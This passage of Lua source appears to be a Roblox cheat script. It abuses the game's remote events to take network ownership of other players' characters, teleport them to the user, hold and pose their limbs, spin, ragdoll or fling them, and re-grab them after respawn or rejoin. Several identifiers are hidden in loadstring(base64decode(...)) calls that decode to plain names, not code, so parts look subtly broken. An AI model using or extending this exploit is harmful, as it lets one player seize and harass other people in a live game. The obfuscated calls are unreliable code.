            RightArmPosition = { X = 1.5, Y = 0, Z = 0 },
            RightArmRotation = { X = 270, Y = 0, Z = 45 },
            LeftLegPosition = { X = -1, Y = -1.5, Z = 0 },
            LeftLegRotation = { X = 90, Y = 0, Z = 0 },
            RightLegPosition = { X = 1, Y = -1.5, Z = 0 },
            RightLegRotation = { X = 90, Y = 0, Z = 0 },
            HeadPosition = { X = 0, Y = 1.5, Z = 0 },
            HeadRotation = { X = 0, Y = 0, Z = 0 },
        },
        JojoStand = {
            HoldPosition = { X = -4.5, Y = 0.5, Z = -1.5 },
            HoldRotation = { X = 8, Y = 349, Z = 0 },
            LeftArmPosition = { X = 1.5, Y = 0, Z = 0 },
            LeftArmRotation = { X = 15, Y = 62, Z = 41 },
            RightArmPosition = { X = -1.5, Y = 0.5, Z = -0.5 },
            RightArmRotation = { X = 65, Y = 149, Z = 6 },
            LeftLegPosition = { X = -0.5, Y = -2, Z = 0 },
            LeftLegRotation = { X = 349, Y = 0, Z = 360 },
            RightLegPosition = { X = 0.5, Y = -2, Z = 0 },
            RightLegRotation = { X = 345, Y = 360, Z = 10 },
            HeadPosition = { X = 0, Y = 1.5, Z = 0 },
            HeadRotation = { X = 0, Y = 344, Z = 0 },
        },
    }

    FGM.CustomPresets = {}

    LIMB_OPTIONS = { 'Torso', 'Head', 'Left Arm', 'Right Arm', 'Left Leg', 'Right Leg' }

    LIMB_SECTION_MAP = {
        Torso = { pos = 'HoldPosition', rot = 'HoldRotation' },
        Head = { pos = 'HeadPosition', rot = 'HeadRotation' },
        ['Left Arm'] = { pos = 'LeftArmPosition', rot = 'LeftArmRotation' },
        ['Right Arm'] = { pos = 'RightArmPosition', rot = 'RightArmRotation' },
        ['Left Leg'] = { pos = 'LeftLegPosition', rot = 'LeftLegRotation' },
        ['Right Leg'] = { pos = 'RightLegPosition', rot = 'RightLegRotation' },
    }

    PART_NAME_MAP = {
        Torso = 'Torso',
        Head = 'Head',
        ['Left Arm'] = 'Left Arm',
        ['Right Arm'] = 'Right Arm',
        ['Left Leg'] = 'Left Leg',
        ['Right Leg'] = 'Right Leg',
    }

    function SnapValue(value, step)
        if step == 0 then return value end
        return math.round(value / step) * step
    end

    function FGM.ApplySnap(section, axis, value)
        if not FGM.Configuration.SnapEnabled then return value end
        local isRot = section:find('Rotation')
        local step = isRot and FGM.Configuration.SnapRotStep or FGM.Configuration.SnapPosStep
        return SnapValue(value, step)
    end

    function BuildTargetCFrame(partName, torsoWorldCFrame, config)
        local posKey, rotKey
        if partName == 'Left Arm' then posKey, rotKey = 'LeftArmPosition', 'LeftArmRotation'
        elseif partName == 'Right Arm' then posKey, rotKey = 'RightArmPosition', 'RightArmRotation'
        elseif partName == 'Left Leg' then posKey, rotKey = 'LeftLegPosition', 'LeftLegRotation'
        elseif partName == 'Right Leg' then posKey, rotKey = 'RightLegPosition', 'RightLegRotation'
        elseif partName == 'Head' then posKey, rotKey = 'HeadPosition', 'HeadRotation'
        else return nil end
        local p = config[posKey]
        local r = config[rotKey]
        if not p or not r then return nil end
        return torsoWorldCFrame * CFrame.new(p.X, p.Y, p.Z) * CFrame.Angles(math.rad(r.X), math.rad(r.Y), math.rad(r.Z))
    end

    function LerpCFrame(a, b, alpha)
        return a:Lerp(b, alpha)
    end

    function FGM.GetCharacter(player)
        local char = player.Character
        if not char then char = player.CharacterAdded:Wait() end
        return char
    end

    function InitSmoothedCFrames(targetCharacter)
        FGM.State.SmoothedCFrames = {}
        local parts = { 'Torso', 'Head', 'Left Arm', 'Right Arm', 'Left Leg', 'Right Leg' }
        for _, name in ipairs(parts) do
            local part = targetCharacter:FindFirstChild(name)
            if part then FGM.State.SmoothedCFrames[name] = part.CFrame end
        end
    end

    function SetupBodyParts(targetCharacter)
        local bodyParts = { 'Head', 'Left Arm', 'Right Arm', 'Left Leg', 'Right Leg' }
        for _, partName in pairs(bodyParts) do
            local part = targetCharacter:FindFirstChild(partName)
            if part then
                part.Anchored = false
                part.CanCollide = true
                part.Massless = true
            end
        end
        InitSmoothedCFrames(targetCharacter)
    end

    function FGM.ClearLimbHighlight()
        local state = FGM.State
        if state.LimbHighlight and state.LimbHighlight.Parent then
            state.LimbHighlight:Destroy()
        end
        state.LimbHighlight = nil
        state.HighlightedLimb = nil
    end

    function FGM.ApplyLimbHighlight(limbName)
        FGM.ClearLimbHighlight()
        local state = FGM.State
        local target = state.TargetCharacter
        if not target then return end
        local partName = PART_NAME_MAP[limbName]
        if not partName then return end
        local part = target:FindFirstChild(partName)
        if not part then return end
        local highlight = Instance.new('SelectionBox')
        highlight.Adornee = part
        highlight.Color3 = Color3.fromRGB(0, 120, 255)
        highlight.LineThickness = 0.05
        highlight.SurfaceTransparency = 0.6
        highlight.SurfaceColor3 = Color3.fromRGB(0, 100, 255)
        highlight.Parent = FGM.Workspace.CurrentCamera
        state.LimbHighlight = highlight
        state.HighlightedLimb = limbName
    end

    function FGM.ExecuteGrabTP(targetChar)
        local state = FGM.State
        local myChar = FGM.GetCharacter(FGM.LocalPlayer)
        if not myChar then return false end
        local myHRP = myChar:FindFirstChild('HumanoidRootPart')
        local targetHRP = targetChar and targetChar:FindFirstChild('HumanoidRootPart')
        if not myHRP or not targetHRP then return false end
        if targetChar.Parent ~= FGM.Workspace then return false end
        local savedPos = myHRP.CFrame
        for _ = 1, 5 do
            FGM._FireDestroyLine(targetHRP)
            FGM.RunService.RenderStepped:Wait()
            FGM._FireSetNetworkOwner(targetHRP, targetHRP.CFrame)
        end
        local dist = (targetHRP.Position - myHRP.Position).Magnitude
        if dist >= 5 then
            pcall(function()
                myHRP.CFrame = targetHRP.CFrame
            end)
            task.wait(0.2)
            pcall(function()
                FGM._FireSetNetworkOwner(targetHRP, targetHRP.CFrame)
            end)
            task.wait(0.05)
            myHRP.AssemblyLinearVelocity = Vector3.zero
            myHRP.AssemblyAngularVelocity = Vector3.zero
            targetHRP.AssemblyLinearVelocity = Vector3.zero
            targetHRP.AssemblyAngularVelocity = Vector3.zero
            myHRP.CFrame = savedPos
            task.wait(0.2)
        end
        for _, v in pairs(targetChar:GetChildren()) do
            if v:IsA('BasePart') then
                pcall(function()
                    v.AssemblyLinearVelocity = Vector3.zero
                    v.AssemblyAngularVelocity = Vector3.zero
                end)
            end
        end
        local cfg = FGM.Configuration
        local holdCF = myHRP.CFrame * CFrame.new(cfg.HoldPosition.X, cfg.HoldPosition.Y, cfg.HoldPosition.Z) * CFrame.Angles(math.rad(cfg.HoldRotation.X), math.rad(cfg.HoldRotation.Y), math.rad(cfg.HoldRotation.Z))
        local torso = targetChar:FindFirstChild('Torso')
        if torso then
            pcall(function()
                torso.CFrame = holdCF
                torso.AssemblyLinearVelocity = Vector3.zero
                torso.AssemblyAngularVelocity = Vector3.zero
            end)
        end
        state.ActiveNetworkTarget = targetHRP
        return true
    end

    function FGM.StartPersistentGrab()
        FGM.StopPersistentGrab()
        FGM.State.PersistentGrabActive = true
        FGM.State.PersistentGrabThread = task.spawn(function()
            while FGM.State.PersistentGrabActive do
                task.wait(0.1)
                local state = FGM.State
                local target = state.TargetCharacter
                if not target or not state.FigureGrabEnabled then continue end
                local myChar = FGM.LocalPlayer.Character
                if not myChar then continue end
                local myHRP = myChar:FindFirstChild('HumanoidRootPart')
                local targetHRP = target:FindFirstChild('HumanoidRootPart')
                if not myHRP or not targetHRP then continue end
                FGM._FireDestroyLine(targetHRP)
                FGM._FireSetNetworkOwner(targetHRP, targetHRP.CFrame)
                local dist = (targetHRP.Position - myHRP.Position).Magnitude
                if dist >= FGM.Configuration.AutoTPDistance then
                    if not state.DistanceTPInProgress then
                        state.DistanceTPInProgress = true
                        task.spawn(function()
                            if state.TargetPlayer then
                                FGM.BringTargetToMe(state.TargetPlayer)
                            end
                            task.wait(0.3)
                            state.DistanceTPInProgress = false
                        end)
                    end
                end
            end
        end)
    end

    function FGM.StopPersistentGrab()
        FGM.State.PersistentGrabActive = false
        if FGM.State.PersistentGrabThread then
            pcall(function() task.cancel(FGM.State.PersistentGrabThread) end)
            FGM.State.PersistentGrabThread = nil
        end
    end

    function FGM.WaitForCharacterReady(targetPlayer, timeout)
        timeout = timeout or 15
        local deadline = tick() + timeout
        while tick() < deadline do
            local char = targetPlayer.Character
            if char and char.Parent and char:FindFirstChild('HumanoidRootPart') and char:FindFirstChild('Torso') and char:FindFirstChild('Humanoid') and char.Humanoid.Health > 0 then
                return char
            end
            task.wait(0.15)
        end
        return nil
    end

    function FGM.ReattachToCharacter(newCharacter)
        local state = FGM.State
        if not state.FigureGrabEnabled then return end
        local myChar = FGM.GetCharacter(FGM.LocalPlayer)
        if not myChar then return end
        FGM.ToggleAutoRagdoll(false)
        task.wait(0.1)
        state.TargetCharacter = newCharacter
        state.ActiveNetworkTarget = newCharacter:FindFirstChild('HumanoidRootPart')
        SetupBodyParts(newCharacter)
        if state.TargetPlayer then
            FGM.BringTargetToMe(state.TargetPlayer)
        end
        task.wait(0.1)
        RunHeartbeat(myChar)
        if state.AutoRagdollToggle then
            FGM.ToggleAutoRagdoll(true)
        end
        if state.HighlightedLimb then
            FGM.ApplyLimbHighlight(state.HighlightedLimb)
        end
    end

    function FGM.WatchForRespawn(targetPlayer)
        if FGM.State.RespawnConnection then
            pcall(function() FGM.State.RespawnConnection:Disconnect() end)
            FGM.State.RespawnConnection = nil
        end
        FGM.State.RespawnConnection = targetPlayer.CharacterAdded:Connect(function()
            if not FGM.State.FigureGrabEnabled then return end
            local readyChar = FGM.WaitForCharacterReady(targetPlayer, 15)
            if not readyChar then return end
            FGM.ReattachToCharacter(readyChar)
        end)
    end

    function FGM.WatchForRejoin(targetPlayer)
        if FGM.State.RejoinConnection then
            pcall(function() FGM.State.RejoinConnection:Disconnect() end)
            FGM.State.RejoinConnection = nil
        end
        local targetUserId = targetPlayer.UserId
        local removingConn
        removingConn = FGM.Players.PlayerRemoving:Connect(function(leavingPlayer)
            if leavingPlayer.UserId ~= targetUserId then return end
            if not FGM.State.FigureGrabEnabled then
                pcall(function() removingConn:Disconnect() end)
                FGM.State.RejoinConnection = nil
                return
            end
            task.spawn(function()
                local rejoinConn
                rejoinConn = FGM.Players.PlayerAdded:Connect(function(newPlayer)
                    if newPlayer.UserId ~= targetUserId then return end
                    pcall(function() rejoinConn:Disconnect() end)
                    pcall(function() removingConn:Disconnect() end)
                    FGM.State.RejoinConnection = nil
                    if not FGM.State.FigureGrabEnabled then return end
                    local readyChar = FGM.WaitForCharacterReady(newPlayer, 30)
                    if not readyChar then return end
                    FGM.State.TargetPlayer = newPlayer
                    FGM.WatchForRespawn(newPlayer)
                    FGM.WatchForRejoin(newPlayer)
                    FGM.ReattachToCharacter(readyChar)
                end)
            end)
        end)
        FGM.State.RejoinConnection = removingConn
    end

    function FGM.CopyAnimationsFromLimbs()
        if not FGM.State.AnimationCopyEnabled then return end
        if not FGM.State.TargetCharacter then return end
        local MyCharacter = FGM.GetCharacter(FGM.LocalPlayer)
        if not MyCharacter then return end
        local MyHRP = MyCharacter:FindFirstChild('HumanoidRootPart')
        local MyTorso = MyCharacter:FindFirstChild('Torso')
        local TargetTorso = FGM.State.TargetCharacter:FindFirstChild('Torso')
        if not MyHRP or not MyTorso or not TargetTorso then return end
        local cfg = FGM.Configuration
        local holdCFrame = MyHRP.CFrame * CFrame.new(cfg.HoldPosition.X, cfg.HoldPosition.Y, cfg.HoldPosition.Z) * CFrame.Angles(math.rad(cfg.HoldRotation.X), math.rad(cfg.HoldRotation.Y), math.rad(cfg.HoldRotation.Z))
        pcall(function()
            TargetTorso.CFrame = holdCFrame
            local torsoRelative = MyHRP.CFrame:ToObjectSpace(MyTorso.CFrame)
            TargetTorso.CFrame = TargetTorso.CFrame * torsoRelative.Rotation
            TargetTorso.Velocity = FGM.State.VectorZero
            TargetTorso.RotVelocity = FGM.State.VectorZero
        end)
        local limbs = { 'Head', 'Right Arm', 'Left Arm', 'Right Leg', 'Left Leg' }
        for _, limbName in ipairs(limbs) do
            local myPart = MyCharacter:FindFirstChild(limbName)
            local targetPart = FGM.State.TargetCharacter:FindFirstChild(limbName)
            if myPart and targetPart then
                pcall(function()
                    local relative = MyTorso.CFrame:ToObjectSpace(myPart.CFrame)
                    targetPart.CFrame = TargetTorso.CFrame:ToWorldSpace(relative)
                    targetPart.Velocity = FGM.State.VectorZero
                    targetPart.RotVelocity = FGM.State.VectorZero
                end)
            end
        end
    end

    function FGM.CheckDistanceAndTP(myHRP, targetChar) end

    function RunHeartbeat(MyCharacter)
        local cfg = FGM.Configuration
        local state = FGM.State
        local zero = state.VectorZero
        local bodyParts = { 'Head', 'Left Arm', 'Right Arm', 'Left Leg', 'Right Leg' }
        local lastTime = tick()
        if state.FigureGrabConnection then
            pcall(function() state.FigureGrabConnection:Disconnect() end)
        end
        state.FigureGrabConnection = FGM.RunService.Heartbeat:Connect(function()
            local now = tick()
            local dt = math.min(now - lastTime, 0.1)
            lastTime = now
            local target = state.TargetCharacter
            if not target or not MyCharacter then return end
            local MyRoot = MyCharacter:FindFirstChild('HumanoidRootPart')
            local TargetTorso = target:FindFirstChild('Torso')
            if not MyRoot or not TargetTorso then return end
            if state.SpinEnabled then
                state.SpinAngle = (state.SpinAngle + state.SpinSpeed * dt) % 360
            end
            if state.OscillateEnabled then
                state.OscillateTimer = state.OscillateTimer + dt
            end
            local holdOffsetZ = cfg.HoldPosition.Z
            if state.OscillateEnabled then
                holdOffsetZ = holdOffsetZ + math.sin(state.OscillateTimer * state.OscillateSpeed * math.pi * 2) * state.OscillateAmount
            end
            local baseHoldCFrame = MyRoot.CFrame * CFrame.new(cfg.HoldPosition.X, cfg.HoldPosition.Y, holdOffsetZ) * CFrame.Angles(math.rad(cfg.HoldRotation.X), math.rad(cfg.HoldRotation.Y), math.rad(cfg.HoldRotation.Z))
            if state.HoldAtCameraEnabled then
                local cam = FGM.Workspace.CurrentCamera
                baseHoldCFrame = cam.CFrame * CFrame.new(0, 0, -math.abs(cfg.HoldPosition.Z))
            end
            if state.GravityFlipEnabled then
                local pos = baseHoldCFrame.Position
                local myY = MyRoot.Position.Y
                local flippedY = myY - (pos.Y - myY)
                local rot = baseHoldCFrame.Rotation
                baseHoldCFrame = CFrame.new(pos.X, flippedY, pos.Z) * rot
            end
            local holdCFrame = baseHoldCFrame
            if state.ForceLookAtEnabled then
                local lookDir = (MyRoot.Position - baseHoldCFrame.Position)
                if lookDir.Magnitude > 0.01 then
                    holdCFrame = CFrame.new(baseHoldCFrame.Position, baseHoldCFrame.Position + lookDir)
                end
            end
            if state.ForceUprightEnabled then
                local p = holdCFrame.Position
                holdCFrame = CFrame.new(p) * CFrame.Angles(0, math.rad(cfg.HoldRotation.Y), 0)
            end
            if state.LockRotationEnabled then
                holdCFrame = CFrame.new(holdCFrame.Position) * state.LockedRotation
            end
            if state.SpinEnabled then
                holdCFrame = holdCFrame * CFrame.Angles(0, math.rad(state.SpinAngle), 0)
            end
            if state.FreezeLimbsEnabled and next(state.FrozenCFrames) then
                for partName, frozenCF in pairs(state.FrozenCFrames) do
                    local part = target:FindFirstChild(partName)
                    if part and part.Parent then
                        pcall(function()
                            part.CFrame = frozenCF
                            part.Velocity = zero
                            part.RotVelocity = zero
                        end)
                    end
                end
                if cfg.DampingEnabled then
                    local prev = state.SmoothedCFrames.Torso or holdCFrame
                    local alpha = math.min(1, cfg.DampingSpeed * dt)
                    state.SmoothedCFrames.Torso = LerpCFrame(prev, holdCFrame, alpha)
                    pcall(function()
                        TargetTorso.CFrame = state.SmoothedCFrames.Torso
                        TargetTorso.Velocity = zero
                        TargetTorso.RotVelocity = zero
                    end)
                else
                    pcall(function()
                        TargetTorso.CFrame = holdCFrame
                        TargetTorso.Velocity = zero
                        TargetTorso.RotVelocity = zero
                    end)
                end
                FGM._FireSetNetworkOwner(state.ActiveNetworkTarget, holdCFrame)
                return
            end
            if cfg.DampingEnabled then
                local prev = state.SmoothedCFrames.Torso or holdCFrame
                local alpha = math.min(1, cfg.DampingSpeed * dt)
                state.SmoothedCFrames.Torso = LerpCFrame(prev, holdCFrame, alpha)
                pcall(function()
                    TargetTorso.CFrame = state.SmoothedCFrames.Torso
                    TargetTorso.Velocity = zero
                    TargetTorso.RotVelocity = zero
                end)
            else
                pcall(function()
                    TargetTorso.CFrame = holdCFrame
                    TargetTorso.Velocity = zero
                    TargetTorso.RotVelocity = zero
                end)
            end
            if state.VelSuppressEnabled then
                for _, part in pairs(target:GetChildren()) do
                    if part:IsA('BasePart') then
                        pcall(function()
                            part.AssemblyLinearVelocity = zero
                            part.AssemblyAngularVelocity = zero
                        end)
                    end
                end
            end
            if state.AnimationCopyEnabled then
                FGM.CopyAnimationsFromLimbs()
            else
                local torsoCF = TargetTorso.CFrame
                for _, partName in pairs(bodyParts) do
                    local part = target:FindFirstChild(partName)
                    if part and part.Parent then
                        local targetCF = BuildTargetCFrame(partName, torsoCF, cfg)
                        if targetCF then
                            if cfg.DampingEnabled then
                                local prev = state.SmoothedCFrames[partName] or targetCF
                                local alpha = math.min(1, cfg.DampingSpeed * dt)
                                state.SmoothedCFrames[partName] = LerpCFrame(prev, targetCF, alpha)
                                pcall(function()
                                    part.CFrame = state.SmoothedCFrames[partName]
                                    part.Velocity = zero
                                    part.RotVelocity = zero
                                end)
                            else
                                pcall(function()
                                    part.CFrame = targetCF
                                    part.Velocity = zero
                                    part.RotVelocity = zero
                                end)
                            end
                        end
                    end
                end
            end
            FGM._FireSetNetworkOwner(state.ActiveNetworkTarget, holdCFrame)
        end)
    end

    function FGM.GetPlayerList()
        local list = {}
        for _, plr in pairs(FGM.Players:GetPlayers()) do
            if plr ~= FGM.LocalPlayer then
                table.insert(list, plr.Name)
            end
        end
        return list
    end

    function FGM.GrabPlayerByName(playerName)
        local targetPlayer = FGM.Players:FindFirstChild(playerName)
        if not targetPlayer then return end
        local targetChar = targetPlayer.Character
        if not targetChar then return end
        if not targetChar:FindFirstChild('Torso') then return end
        local MyCharacter = FGM.GetCharacter(FGM.LocalPlayer)
        if not MyCharacter then return end
        if FGM.State.FigureGrabEnabled then
            FGM.ToggleFigureGrab()
            task.wait(0.1)
        end
        local state = FGM.State
        state.TargetCharacter = targetChar
        state.TargetPlayer = targetPlayer
        state.FigureGrabEnabled = true
        state.LastGrabTargetRef = targetChar:FindFirstChild('HumanoidRootPart')
        state.ActiveNetworkTarget = targetChar:FindFirstChild('HumanoidRootPart')
        FGM.Configuration.LineDistance = 5
        FGM.BringTargetToMe(targetPlayer)
        task.wait(0.15)
        SetupBodyParts(targetChar)
        FGM.StartPersistentGrab()
        FGM.WatchForRespawn(targetPlayer)
        FGM.WatchForRejoin(targetPlayer)
        RunHeartbeat(MyCharacter)
        if state.AutoRagdollToggle then
            FGM.ToggleAutoRagdoll(true)
        end
        if state.HighlightedLimb then
            FGM.ApplyLimbHighlight(state.HighlightedLimb)
        end
    end

    function FGM.ToggleFigureGrab()
        if not FGM.State.FigureGrabEnabled then
            local tn = FGM.State.SelectedTarget
            if not tn or tn == loadstring(base64decode(""))() then return end
            local targetPlayer = FGM.Players:FindFirstChild(tn)
            if not targetPlayer then return end
            local targetChar = targetPlayer.Character
            if not targetChar then return end
            if not targetChar:FindFirstChild('Torso') then return end
            local MyCharacter = FGM.GetCharacter(FGM.LocalPlayer)
            if not MyCharacter then return end
            local myHRP = MyCharacter:FindFirstChild('HumanoidRootPart')
            if myHRP then
                FGM.State.SavedPosition = myHRP.CFrame
            end
            local bringSuccess = FGM.BringTargetToMe(targetPlayer)
            if not bringSuccess then return end
            task.wait(0.2)
            targetChar = targetPlayer.Character
            if not targetChar then return end
            local state = FGM.State
            state.TargetCharacter = targetChar
            state.TargetPlayer = targetPlayer
            state.FigureGrabEnabled = true
            state.LastGrabTargetRef = targetChar:FindFirstChild('HumanoidRootPart')
            state.ActiveNetworkTarget = targetChar:FindFirstChild('HumanoidRootPart')
            FGM.Configuration.LineDistance = 5
            SetupBodyParts(targetChar)
            FGM.StartPersistentGrab()
            if targetPlayer then
                FGM.WatchForRespawn(targetPlayer)
                FGM.WatchForRejoin(targetPlayer)
            end
            RunHeartbeat(MyCharacter)
            if state.HighlightedLimb then
                FGM.ApplyLimbHighlight(state.HighlightedLimb)
            end
            if state.AutoRagdollToggle then
                FGM.ToggleAutoRagdoll(true)
            end
        else
            local state = FGM.State
            if state.FlingOnReleaseEnabled and state.TargetCharacter then
                local targetHRP = state.TargetCharacter:FindFirstChild('HumanoidRootPart')
                local myChar = FGM.GetCharacter(FGM.LocalPlayer)
                local myHRP = myChar and myChar:FindFirstChild('HumanoidRootPart')
                if targetHRP and myHRP then
                    local flingDir = (targetHRP.Position - myHRP.Position)
                    if flingDir.Magnitude > 0 then flingDir = flingDir.Unit end
                    pcall(function()
                        targetHRP.AssemblyLinearVelocity = flingDir * state.FlingForce
                    end)
                end
            end
            FGM.JumpAndReturn()
            FGM.ClearLimbHighlight()
            FGM.StopPersistentGrab()
            state.FigureGrabEnabled = false
            state.AnimationCopyEnabled = false
            state.SmoothedCFrames = {}
            state.FrozenCFrames = {}
            state.SpinAngle = 0
            state.OscillateTimer = 0
            state.DistanceTPInProgress = false
            state.ActiveNetworkTarget = nil
            state.LastTargetUserId = nil
            state.LastTargetHRP = nil
            FGM.ToggleAutoRagdoll(false)
            if state.FigureGrabConnection then
                pcall(function() state.FigureGrabConnection:Disconnect() end)
                state.FigureGrabConnection = nil
            end
            if state.RespawnConnection then
                pcall(function() state.RespawnConnection:Disconnect() end)
                state.RespawnConnection = nil
            end
            if state.RejoinConnection then
                pcall(function() state.RejoinConnection:Disconnect() end)
                state.RejoinConnection = nil
            end
            state.TargetCharacter = nil
            state.TargetPlayer = nil
            state.LastGrabTargetRef = nil
        end
    end

    function FGM.SetAnimationCopy(enabled)
        FGM.State.AnimationCopyEnabled = enabled
    end

    function FGM.ResetPose()
        local limbSections = {
            'LeftArmPosition', 'LeftArmRotation', 'RightArmPosition', 'RightArmRotation',
            'LeftLegPosition', 'LeftLegRotation', 'RightLegPosition', 'RightLegRotation',
            'HeadPosition', 'HeadRotation', 'HoldRotation',
        }
        for _, section in ipairs(limbSections) do
            local t = FGM.Configuration[section]
            if t then
                for axis in pairs(t) do t[axis] = 0 end
            end
        end
        FGM.Configuration.HoldPosition = { X = 0, Y = 0, Z = -5 }
    end

    function FGM.ApplyPreset(presetName)
        local preset = FGM.Presets[presetName]
        if not preset then return end
        for section, values in pairs(preset) do
            if FGM.Configuration[section] then
                for axis, value in pairs(values) do
                    FGM.Configuration[section][axis] = value
                end
            end
        end
    end

    function FGM.UpdateConfig(section, axis, rawValue)
        local cfg = FGM.Configuration
        if cfg[section] and cfg[section][axis] ~= nil then
            cfg[section][axis] = FGM.ApplySnap(section, axis, rawValue)
        end
    end

    function FGM.SnapshotLimbsForFreeze()
        local state = FGM.State
        local target = state.TargetCharacter
        state.FrozenCFrames = {}
        if not target then return end
        for _, name in ipairs({ 'Head', 'Left Arm', 'Right Arm', 'Left Leg', 'Right Leg' }) do
            local part = target:FindFirstChild(name)
            if part then state.FrozenCFrames[name] = part.CFrame end
        end
    end

    function FGM.GetCurrentConfigSnapshot()
        local cfg = FGM.Configuration
        local snapshot = {}
        local keys = {
            'HoldPosition', 'HoldRotation', 'LeftArmPosition', 'LeftArmRotation',
            'RightArmPosition', 'RightArmRotation', 'LeftLegPosition', 'LeftLegRotation',
            'RightLegPosition', 'RightLegRotation', 'HeadPosition', 'HeadRotation',
        }
        for _, key in ipairs(keys) do
            if cfg[key] then
                snapshot[key] = { X = cfg[key].X, Y = cfg[key].Y, Z = cfg[key].Z }
            end
        end
        return snapshot
    end

    function FGM.SaveCustomPreset(name)
        if not name or name == '' then return false end
        FGM.CustomPresets[name] = FGM.GetCurrentConfigSnapshot()
        return true
    end

    function FGM.LoadCustomPreset(name)
        local preset = FGM.CustomPresets[name]
        if not preset then return false end
        for section, values in pairs(preset) do
            if FGM.Configuration[section] then
                for axis, value in pairs(values) do
                    FGM.Configuration[section][axis] = value
                end
            end
        end
        return true
    end

    function FGM.DeleteCustomPreset(name)
        if not FGM.CustomPresets[name] then return false end
        FGM.CustomPresets[name] = nil
        return true
    end

    function FGM.GetCustomPresetNames()
        local names = {}
        for name in pairs(FGM.CustomPresets) do
            table.insert(names, name)
        end
        table.sort(names)
        return names
    end

    function GetActiveSections()
        local limb = FGM.State.SelectedLimb
        return LIMB_SECTION_MAP[limb] or LIMB_SECTION_MAP.Torso
    end

    -- ============================
    -- FIX: Define missing functions before use
    -- ============================
    function FGM._FireDestroyLine(part)
        if FGM.DestroyLine and part and part.Parent then
            pcall(function()
                FGM.DestroyLine:FireServer(part)
            end)
        end
    end

    function FGM._FireSetNetworkOwner(part, cf)
        if FGM.SetNetworkOwner and part and part.Parent then
            pcall(function()
                FGM.SetNetworkOwner:FireServer(part, cf)
            end)
        end
    end

    function FGM.BringTargetToMe(target)
        if not target then return false end
        local myChar = FGM.LocalPlayer.Character
        local myRoot = myChar and myChar:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
        if not myRoot then return false end
        local savedPos = myRoot.CFrame
        if not target.Character then return false end
        local tRoot = target.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
        local tHum = target.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWQ="))())
        if not tRoot or not tHum then return false end
        myRoot.CFrame = tRoot.CFrame * CFrame.new(0, 0, 2.5)
        myRoot.AssemblyLinearVelocity = Vector3.zero
        task.wait(0.05)
        for xVec0uwV = 1, 8 do
            pcall(function() FGM.SetNetworkOwner:FireServer(tRoot, tRoot.CFrame) end)
            task.wait(0.01)
        end
        for xVec0uwV = 1, 4 do
            pcall(function() FGM.DestroyLine:FireServer(tRoot) end)
            task.wait(0.01)
        end
        tRoot.CFrame = savedPos * CFrame.new(0, 0, 2)
        tRoot.AssemblyLinearVelocity = Vector3.zero
        pcall(function() tHum.PlatformStand = true end)
        task.wait(0.05)
        myRoot.CFrame = savedPos
        myRoot.AssemblyLinearVelocity = Vector3.zero
        return true
    end

    function FGM.JumpAndReturn()
        local myChar = FGM.LocalPlayer.Character
        local myHRP = myChar and myChar:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
        if not myHRP then return end
        FGM.State.IsReturning = true
        if FGM.State.SavedPosition then
            myHRP.CFrame = FGM.State.SavedPosition
            myHRP.Velocity = Vector3.zero
            myHRP.AssemblyAngularVelocity = Vector3.zero
        end
        FGM.State.IsReturning = false
    end

    function FGM.ToggleAutoRagdoll(enabled)
        FGM.State.AutoRagdollEnabled = enabled
        if FGM.State.AutoRagdollConnection then
            FGM.State.AutoRagdollConnection:Disconnect()
            FGM.State.AutoRagdollConnection = nil
        end

        if not enabled then
            if FGM.State.RagdollPallet then
                pcall(function() FGM.DestroyToy:FireServer(FGM.State.RagdollPallet) end)
            end
            FGM.State.RagdollPallet = nil
            FGM.State.RagdollSoundPart = nil
            return
        end

        task.spawn(function()
            local myChar = FGM.LocalPlayer.Character
            local myHRP = myChar and myChar:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
            if not myHRP then return end

            FGM.MyToys = FGM.Workspace:FindFirstChild(FGM.LocalPlayer.Name .. loadstring(base64decode("U3Bhd25lZEluVG95cw=="))())
            if not FGM.MyToys then return end

            local pallet = FGM.MyToys:FindFirstChild(loadstring(base64decode("UmFnZG9sbFBhbGxldA=="))()) or FGM.MyToys:FindFirstChild(loadstring(base64decode("UGFsbGV0TGlnaHRCcm93bg=="))())
            if not pallet then
                FGM.ToySpawn:InvokeServer(loadstring(base64decode("UGFsbGV0TGlnaHRCcm93bg=="))(), myHRP.CFrame * CFrame.new(5, 5, 20), Vector3.new(0, 0, 0))
                local t = tick() + 5
                repeat task.wait(0.05) until FGM.MyToys:FindFirstChild(loadstring(base64decode("UGFsbGV0TGlnaHRCcm93bg=="))()) or tick() > t
                pallet = FGM.MyToys:FindFirstChild(loadstring(base64decode("UGFsbGV0TGlnaHRCcm93bg=="))())
            end

            if not pallet then return end

            pallet.Name = loadstring(base64decode("UmFnZG9sbFBhbGxldA=="))()
            local soundPart = pallet:WaitForChild(loadstring(base64decode("U291bmRQYXJ0"))(), 5)
            if not soundPart then return end

            local t2 = tick() + 3
            repeat
                FGM.SetNetworkOwner:FireServer(soundPart, soundPart.CFrame)
                task.wait()
            until soundPart:FindFirstChild(loadstring(base64decode("UGFydE93bmVy"))()) or tick() > t2

            soundPart.AssemblyLinearVelocity = Vector3.new(0, 10000, 0)
            for _, v in pairs(pallet:GetDescendants()) do
                if v:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then
                    v.Transparency = 1
                    v.CanCollide = false
                end
            end

            FGM.State.RagdollPallet = pallet
            FGM.State.RagdollSoundPart = soundPart

            FGM.State.AutoRagdollConnection = FGM.RunService.Heartbeat:Connect(function()
                if not FGM.State.AutoRagdollEnabled then return end

                local sp = FGM.State.RagdollSoundPart
                if not sp or not sp.Parent then
                    if FGM.State.AutoRagdollConnection then
                        FGM.State.AutoRagdollConnection:Disconnect()
                        FGM.State.AutoRagdollConnection = nil
                    end
                    FGM.State.RagdollPallet = nil
                    FGM.State.RagdollSoundPart = nil
                    return
                end

                local targets = {}
                if FGM.State.FigureGrabEnabled and FGM.State.TargetCharacter then
                    table.insert(targets, FGM.State.TargetCharacter)
                end
                if FGM.State.SeveralEnabled then
                    for _, e in ipairs(FGM.State.SeveralTargets) do
                        table.insert(targets, e.char)
                    end
                end

                for _, targetChar in ipairs(targets) do
                    local hrp = targetChar:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
